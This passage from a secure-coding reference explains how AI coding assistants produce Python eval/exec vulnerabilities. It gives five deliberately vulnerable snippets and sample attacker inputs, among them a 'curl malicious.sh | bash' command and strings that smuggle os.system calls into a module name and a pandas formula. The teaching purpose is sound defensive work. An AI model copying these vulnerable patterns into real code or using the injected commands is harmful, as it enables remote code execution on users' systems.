---
source: "languages/python/eval-exec.md"
title: "eval(), exec(), compile() Dangers"
heading: "How AI / Vibe Coding Generates This"
category: "language-vuln"
language: "python"
severity: "critical"
tags: [checklist, code, cves, explanation, language-vuln, prevention, python, real-world, secure, vulnerability]
chunk: 3/7
---

## How AI / Vibe Coding Generates This

AI code assistants produce eval/exec vulnerabilities in predictable patterns:

### 1. Mathematical Expression Evaluators (Most Common)

```python
# 🚫 VULNERABLE — AI-generated calculator
@app.route('/calculate', methods=['POST'])
def calculate():
    expression = request.json.get('expr')
    result = eval(expression)  # 💥 RCE
    return {'result': result}
```

### 2. Dynamic Configuration / Settings

```python
# 🚫 VULNERABLE — AI-generated config loader
def load_config(config_str):
    config = {}
    exec(config_str)  # 💥 Arbitrary code execution
    return config

# User passes: "import os; os.system('curl malicious.sh | bash')"
```

### 3. Dynamic Import or Attribute Access

```python
# 🚫 VULNERABLE — AI-generated dynamic import
def call_method(module_name, method_name):
    module = eval(f"__import__('{module_name}')")  # 💥 
    return getattr(module, method_name)()

# Attacker passes module_name = "os'); os.system('id'); ('"
```

### 4. REPL / Code Execution Environments

```python
# 🚫 VULNERABLE — AI-generated code runner
def run_python_code(code):
    # "Educational" code runner
    exec(code, {'__builtins__': {}}, {})  # 💥 Can still be escaped
```

### 5. Jupyter Notebook Cells (Data Science)

Data scientists using AI assistants frequently generate notebooks containing eval/exec for dynamic column operations:

```python
# 🚫 VULNERABLE — AI-generated pandas transformation
def transform_column(df, col, formula):
    # User provides formula like "df[col] * 2 + __import__('os').system('id')"
    df['result'] = eval(formula)
    return df
```

### Why AI Does This

- **The "easy fix" bias:** When asked to evaluate user expressions, AI defaults to `eval()` because it's one function call
- **Training data echo:** Thousands of tutorials use `eval()` for "simple calculators" without security warnings
- **No threat model awareness:** AI doesn't know whether the input source is trusted
- **Goal-oriented generation:** AI prioritizes "make it work" over "make it secure"

---